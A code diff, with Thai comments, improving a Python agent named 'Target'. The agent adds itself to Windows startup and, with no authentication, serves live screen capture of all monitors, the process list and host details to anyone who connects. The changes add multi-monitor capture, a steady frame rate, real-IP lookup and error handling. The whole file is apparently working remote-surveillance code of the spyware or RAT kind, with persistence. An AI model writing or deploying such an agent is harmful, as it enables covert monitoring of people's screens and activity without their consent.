@@ -12,6 +12,7 @@ from PIL import ImageGrab
 import pickle
 import struct
 import time
+import pyautogui  # import ให้ครบ
 
 # ---------------------- ตรวจสอบ module ----------------------
 required_modules = ["opencv-python", "numpy", "pillow", "psutil", "pyautogui"]
@@ -28,7 +29,8 @@ def add_to_startup():
         script_path = os.path.abspath(sys.argv[0])
         bat_path = os.path.join(startup, "target_auto_start.bat")
         with open(bat_path, "w") as f:
-            f.write(f'@echo off\npython "{script_path}"\n')
+            # ใช้ sys.executable แทน python
+            f.write(f'@echo off\n"{sys.executable}" "{script_path}"\n')
         print("[INFO] เพิ่ม Target ให้รันอัตโนมัติแล้ว")
     except Exception as e:
         print("[ERROR] ไม่สามารถเพิ่ม Auto Start:", e)
@@ -45,14 +47,17 @@ HOST = '0.0.0.0'
 def handle_live_screen(conn):
     try:
         while True:
-            img = ImageGrab.grab()
+            # จับหน้าจอทั้งหมด (multi-monitor)
+            img = ImageGrab.grab(all_screens=True)
             frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
             encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
             result, encimg = cv2.imencode('.jpg', frame, encode_param)
             data = pickle.dumps(encimg)
             message_size = struct.pack(">L", len(data))
             conn.sendall(message_size + data)
-    except:
+            time.sleep(0.03)  # ประมาณ 30 FPS
+    except Exception as e:
+        print(f"[ERROR] Live screen disconnected: {e}")
         conn.close()
 
 # ---------------------- Process ----------------------
@@ -64,23 +69,33 @@ def handle_process(conn):
         result = "\n".join(processes)
         conn.sendall(result.encode())
         conn.close()
-    except:
+    except Exception as e:
+        print(f"[ERROR] Process handler: {e}")
         conn.close()
 
 # ---------------------- Info ----------------------
 def handle_info(conn):
     try:
         hostname = platform.node()
-        ip_addr = socket.gethostbyname(socket.gethostname())
+        # หา IP จริง ไม่ใช่ 127.0.0.1
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip_addr = s.getsockname()[0]
+        s.close()
         conn.sendall(f"{hostname}|{ip_addr}".encode())
         conn.close()
-    except:
+    except Exception as e:
+        print(f"[ERROR] Info handler: {e}")
         conn.close()
 
 # ---------------------- Server Helper ----------------------
 def start_server(port, handler):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((HOST, port))
+    try:
+        server.bind((HOST, port))
+    except Exception as e:
+        print(f"[ERROR] Bind port {port} failed: {e}")
+        return
     server.listen(5)
     print(f"[INFO] Target listening on port {port}")
     while True:
@@ -94,5 +109,8 @@ if __name__ == "__main__":
     threading.Thread(target=start_server, args=(PORT_PROCESS, handle_process), daemon=True).start()
     threading.Thread(target=start_server, args=(PORT_INFO, handle_info), daemon=True).start()
 
-    while True:
-        time.sleep(1)
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("[INFO] Target stopped by user.")
